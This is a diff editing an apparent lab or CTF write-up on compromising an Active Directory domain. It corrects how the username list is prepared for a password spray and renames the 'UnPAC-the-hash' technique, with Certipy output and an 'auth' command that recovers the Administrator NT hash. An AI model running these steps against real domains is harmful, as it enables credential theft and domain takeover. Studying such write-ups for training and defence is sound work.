@@ -174,7 +174,7 @@ SMB    <DC_IP>    445    DC01    svc_ca          2025-09-14 00:19:35  0
 SMB    <DC_IP>    445    DC01    svc_web         2025-09-13 21:40:40  0       Web Server in Progress
 ```
 
-We save the eleven usernames to `loot/users.txt` for the spray.
+We strip the three built-in accounts (`Administrator`, `Guest`, `krbtgt`) and save the remaining eight users to `loot/users.txt` for the spray.
 
 ### Password Spraying the Default Credential
 
@@ -387,7 +387,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-**Step 3 — Authenticate with the certificate.** Certipy uses the PFX to obtain a Kerberos TGT for `Administrator` via PKINIT, then leverages the U2U/PAC technique to recover the account's NT hash:
+**Step 3 — Authenticate with the certificate.** Certipy uses the PFX to obtain a Kerberos TGT for `Administrator` via PKINIT, then leverages the UnPAC-the-hash technique to recover the account's NT hash:
 
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '<DC_IP>' -domain 'welcome.local'
